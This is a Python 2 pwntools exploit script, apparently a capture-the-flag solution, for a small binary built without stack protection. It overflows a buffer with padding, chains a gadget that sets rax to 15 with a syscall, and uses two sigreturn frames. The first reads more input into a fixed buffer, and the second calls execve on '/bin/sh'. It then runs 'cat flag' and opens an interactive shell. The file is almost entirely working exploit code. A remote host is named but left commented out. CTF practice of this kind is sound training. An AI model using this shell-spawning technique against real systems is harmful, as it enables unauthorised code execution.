#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#gcc -no-pie pwn.c -fno-stack-protector -o pwn
#42.156.14.141 1152
from pwn import*

context(os = 'linux', arch = 'amd64', log_level = 'debug', terminal = ['tmux', 'new-window'])
def debug(cmd=''):
	cmd += "b main\n"
	gdb.attach(p, cmd)
	pause()

host = "43.156.14.141"
port = 1152
p = process("./pwn")
# p = remote(host, port)

rax15 = 0x0000000000401136
syscall = 0x000000000040114D
buf = 0x000000000404060

# debug()
payload = "\x00"*0x28 +p64(rax15)+p64(syscall)
sig = SigreturnFrame()
# sig.uc_flags = syscall
sig.rax = 0
sig.rdi = 0
sig.rsi = buf
sig.rdx = 0x1000
# sig.rcx = 0x1000
sig.rip = syscall
sig.rsp = buf+0x10
sig.csgsfs = (0x002b * 0x1000000000000) | (0x0000 * 0x100000000) | (0x0000 * 0x10000) | (0x0033 * 0x1)
payload += str(sig)

p.send(payload)

payload = "/bin/sh\x00"+p64(0)+p64(rax15)+p64(syscall)
sig = SigreturnFrame()
# sig.uc_flags = syscall
sig.rax = 59
sig.rdi = buf
# sig.rsi = buf
# sig.rdx = 0x1000
# sig.rcx = 0x1000
sig.rip = syscall
sig.rsp = 0x000000000401153
sig.csgsfs = (0x002b * 0x1000000000000) | (0x0000 * 0x100000000) | (0x0000 * 0x10000) | (0x0033 * 0x1)
payload += str(sig)

# debug()
sleep(2)
p.send(payload)
p.sendline("cat flag")




p.interactive()